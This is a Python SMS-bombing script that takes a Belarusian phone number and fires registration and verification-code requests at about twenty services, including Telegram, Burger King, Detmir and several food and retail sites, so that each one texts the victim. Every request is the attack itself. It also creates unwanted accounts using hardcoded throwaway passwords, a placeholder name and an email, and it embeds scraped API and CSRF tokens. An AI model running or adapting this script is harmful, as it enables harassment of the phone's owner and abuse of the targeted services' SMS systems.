import os, sys
#import fake_useragent
import requests
#import time
from colorama import Fore, Back, Style

user = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
headers1 = {'user_agent': user}
print('Введите номер в формате: +375*********')
phone = input()

dates = {
	"phone": "+" + phone
}


response = requests.post('https://my.telegram.org/auth/send_password', data=dates, headers=headers1)
if response.status_code == 200:
    print(Fore.GREEN +"Смс от telegram отправлено!")
else:
    print('\033[31m'+"Смс от telegram не отправлено!")

dates = {
    "CSRF":	"",
	"ACTION":	"REGISTER",
	"MODE":	"PHONE",
	"PHONE": phone,
	"PASSWORD": "123321123У",
	"PASSWORD2": "123321123У"
}

response = requests.post('https://sushihouse.by/?action=auth', data=dates, headers=headers1)

if response.status_code == 200:
    print(Fore.GREEN +"Смс от sushihouse отправлено!")
else:
    print('\033[31m'+"Смс от sushihouse не отправлено!")


dates = {
	"PROPERTY[NAME]": "Виктор",
    "PROPERTY[PHONE]": f"{phone}"
}

response = requests.post('https://delivio.by/be/api/register', json={"phone": f"{phone}"}, headers=headers1)
if response.status_code == 201:
    print(Fore.GREEN +"Смс от delivio отправлено!")
else:
    print('\033[31m'+"Смс от delivio не отправлено!")

dates = {
	"_token": "YhD2mlzKocENXnqmSbhNidVuVElRpX2wAifKrbdB",
	"step":	"1",
	"phone": f"{phone}",
	"smsCode": "",
	"email": "",
	"password":	""
}

sess = requests.Session()

response = requests.post('https://api.static.edostavka.by/rest/Json', json={"CRC":"","Packet":{"JWT":"null","MethodName":"DiscountClub.PutManDiscountShort","ServiceNumber":"01093ABC-6B36-450D-8FAF-EA32BCC2EAE8","Data":{"SourceName":"edostavka.by","LoginNameTypeId":2,"TargetId":"30,31,32","MobileOperatorId":"-1","Family":"-1","WhatSex":"-1","Phone2":"","Address1Name":"","Porch":"","Floorx":"","Address2Name":"","DateOfBirth":"","EMail":"proverkasite238@gmail.com","Phone1":f"{phone[1:]}","Name2":"Иван","Name1":"Иванович","Name3":"Иванов","Password":"123321123Egor","passwordRepeat":"123321123Egor","isVisiblePassword":"false"}}}, headers=headers1)

if response.status_code == 201 or response.status_code == 200:
    print(Fore.GREEN +"Смс от edostavka отправлено!")
else:
    print('\033[31m'+"Смс от edostavka не отправлено!")
    
    

dates = {
	"bxajaxid": "ajax",
	"auth_action": "send_code_sms",
	"PHONE": f"{phone}"
}

sess = requests.Session()

response = requests.post('https://gippo-market.by/local/components/slam/smart.auth/ajax.php', data=dates, headers=headers1)

if response.status_code == 200:
    print(Fore.GREEN +'Смс от gippo-market отправлено!')
else:
    print('\033[31m'+'Смс от gippo-market не отправлено!')
    
    
    
dates = {
	"ajax": "register",
    "login": "morsik",
    "pass": "123321123Eg",
    "phone": f"{phone}",
    "code": "",
    "company": "0",
    "resend": "1",
    "checksum": "570"
}

response = requests.post('https://carte.by/auth/', data=dates, headers=headers1)

if response.status_code == 200:
    print(Fore.GREEN +"Смс от carte отправлено!")
else:
    print('\033[31m'+"Смс от carte не отправлено!")
    
    
dates = {
	"CSRF": "",
    "ACTION": "REGISTER",
    "MODE":	"PHONE",
    "PHONE": f"{phone}",
    "PASSWORD":	"123321123Eg",
    "PASSWORD2": "123321123Eg"
}

response = requests.post('https://yakuzasushi.by/?action=auth', data=dates, headers=headers1)
if response.status_code == 200:
    print(Fore.GREEN +"Смс от yakuzasushi отправлено!")
else:
    print('\033[31m'+"Смс от yakuzasushi не отправлено!")
    
headers1 = {
    "user-agent": user,
    "Accept": "*/*",
    "device-uuid": "f83a6b92-7ccb-4f99-9211-47c557bb25f4"
    }

response = requests.post('https://burger-king.by/api/v1/web/auth/phone', json={"phoneNumber":f"{phone}","clientRequestType":"website"}, headers=headers1)
if response.status_code == 200:
    print(Fore.GREEN +"Смс от burger-king отправлено!")
else:
    print('\033[31m'+"Смс от burger-king не отправлено!")


headers1 = {
    "user-agent": user
    }

dates = {
	"utf8": "✓",
    "authenticity_token": "Uvfp+1tdTfdJbjAHaZKV/RWph4a6SQYO9yQY4dygLDA=",
    "phone_number": "259470881"
}

jsons = {
    
}

response = requests.post('https://api.static.emall.by/rest/Json', json={"CRC":"","Packet":{"JWT":"null","MethodName":"DiscountClub.PutManDiscountShort","ServiceNumber":"C3546D1F-311F-4A6B-BFA5-DD52CDEEB373","Data":{"SourceName":"emall.by","LoginNameTypeId":2,"TargetId":"33,34,35","MobileOperatorId":"-1","Family":"-1","WhatSex":"-1","Phone2":"","Address1Name":"","Porch":"","Floorx":"","Address2Name":"","DateOfBirth":"","EMail":"proverkasite238@gmail.com","Phone1":f"{phone[1:]}","Name2":"Иванов","Name1":"Иван","Name3":"Иванович","Password":"123321123Eg","passwordRepeat":"123321123Eg"}}}, headers=headers1)
if response.status_code == 200:
    print(Fore.GREEN +"Смс от emall отправлено!")
else:
    print('\033[31m'+"Смс от emall не отправлено!")


user = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
headers1 = {
    "user-agent": user
    }

response = requests.post('https://sosedi.by/local/api/smsSend.php', json={"phone":f"{phone}"}, headers=headers1)
if response.status_code == 200:
    print(Fore.GREEN +"Смс от sosedi отправлено!")
else:
    print('\033[31m'+"Смс от sosedi не отправлено!")
    
    
user = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
headers1 = {
    "user-agent": user
    }

response = requests.post('https://adel.newkontinent.by/api/acnewkontinent/check_client/', json={"phone":{"strana":"375","number":f"{phone[4:]}"}}, headers=headers1)
if response.status_code == 200:
    print(Fore.GREEN +"Смс от newkontinent отправлено!")
else:
    print('\033[31m'+"Смс от newkontinent не отправлено!")


user = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
headers1 = {
    "user-agent": user
    }

#!/usr/bin/python
# -*- coding: utf8 -*-
import os, sys
#import fake_useragent
import requests
#import time
from colorama import Fore, Back, Style


response = requests.post('https://evropochta.by/rest/Json?What=DiscountClub.PutManDiscountShort', json={"CRC":"","Packet":{"MethodName":"DiscountClub.PutManDiscountShort","JWT":"null","ServiceNumber":"E811AE79-DFDE-4F85-8715-DD3A8308707E","Data":{"SourceName":"evropochta.by","LoginNameTypeId":"2","TargetId":"36,37,38","MobileOperatorId":"-1","Family":"-1","WhatSex":"-1","Phone2":"","Address1Name":"12","Porch":"1","Floorx":"4","Address2Name":"","DateOfBirth":"","EMail":"proverkasite238@gmail.com","Name2":"Иван","Name1":"Иванович","Name3":"Иванов","Phone1":f"{phone[1:]}","Address3Name":"1","Address4Id":"227177","city":"80907","Address5Id":"80907","Address5Name":"Минск","Password":"123321123Eg","passwordRepeat":"123321123Eg"}}}, headers=headers1)
if response.status_code == 200:
    print(Fore.GREEN +"Смс от evropochta отправлено!")
else:
    print('\033[31m'+"Смс от evropochta не отправлено!")



headers1 = {
    "user-agent": user,
    "Web-User-Agent": "SiteYamigom/2.12.0",
    "ApiToken": "92bQJmj4ISFIJzQqGCEWj1cYDaya6i2k"
    }

response = requests.post('https://yamigom-store.by/api/v2/user/sms', json={"phone_number":f"{phone[1:]}"}, headers=headers1)
if response.status_code == 204:
    print(Fore.GREEN +"Смс от yamigom-store отправлено!")
else:
    print('\033[31m'+"Смс от yamigom-store не отправлено!")


headers1 = {
    "user-agent": user,
    }
dates = {
    "phoneNumber": f"{phone}"
}

response = requests.post('https://autolight.by/auth_fiz/sendSmsByCode.php', data=dates, headers=headers1)
if response.status_code == 200:
    print(Fore.GREEN +"Смс от autolight отправлено!")
else:
    print('\033[31m'+"Смс от autolight не отправлено!")


headers1 = {
    "user-agent": user,
    "X-CSRF-Token": "YUROc2JEQWdhRFI0TUhJ"
}

dates = {
    
}

response = requests.post('https://api.detmir.by/v2/users/auth/sms/send', json={"phone":f"{phone[1:]}"}, headers=headers1)
if response.status_code == 200:
    print(Fore.GREEN +"Смс от detmir отправлено!")
else:
    print('\033[31m'+"Смс от detmir не отправлено!")


dates = {
    "component": "bxmaker.authuserphone.login",
    "sessid": "ef6505cf50385cada164056d347fc483",
    "method": "sendCode",
    "phone": f"{phone}",
    "registration": "Y"
}

response = requests.post('https://xn----7sblod1blc5h.xn--90ais/user/#registration', data=dates, headers=headers1)
if response.status_code == 200:
    print(Fore.GREEN + "Смс от dari-rozy отправлено!")
else:
    print(Fore.RED + "Смс от dari-rozy не отправлено!")


response = requests.post('https://users-service.atlantm.by/api/auth/login', json={"phone":f"{phone}"}, headers=headers1)
if response.status_code == 200:
    print(Fore.GREEN + "Смс от atlantm отправлено!")
else:
    print(Fore.RED + "Смс от atlantm не отправлено!")


dates = {
    "PHONE": f"{phone}"
}

response = requests.post('https://mila.by/local/gtools/register/check.php', data=dates, headers=headers1)
if response.status_code == 200:
    print(Fore.GREEN + "Смс от mila отправлено!")
else:
    print(Fore.RED + "Смс от mila не отправлено!")